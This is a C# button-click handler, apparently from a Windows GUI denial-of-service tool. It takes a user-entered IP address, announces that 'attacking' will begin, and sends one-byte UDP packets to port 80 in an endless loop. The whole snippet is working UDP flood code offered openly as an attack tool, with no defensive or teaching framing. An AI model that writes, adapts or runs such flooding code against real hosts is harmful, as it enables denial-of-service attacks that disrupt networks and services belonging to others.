    private async void metroButton2_Click(object sender, EventArgs e)
    {
        if (textBox1.Text == "")
        {
            MetroMessageBox.Show(this, "Please input a IP-Address", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        else
        {
    
    
            MetroMessageBox.Show(this, "Attacking will start untill you manually stop it", "INFO", MessageBoxButtons.OK, MessageBoxIcon.Hand);
    
            string acttive = "active";
    
    
            byte[] packetData = System.Text.ASCIIEncoding.ASCII.GetBytes("a");
            string IP = textBox1.Text;
            int port = 80;
    
            IPEndPoint ep = new IPEndPoint(IPAddress.Parse(IP), port);
    
            Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            System.Threading.Thread.Sleep(500);
    
            await Task.Run
            (
                () =>
                {
                    while (acttive == "active")
                        client.SendTo(packetData, ep);
                }
            );
    
            // Rest of your code here will wait for the while loop to exit
        }
        // Rest of your code here will wait for the while loop to exit
    }
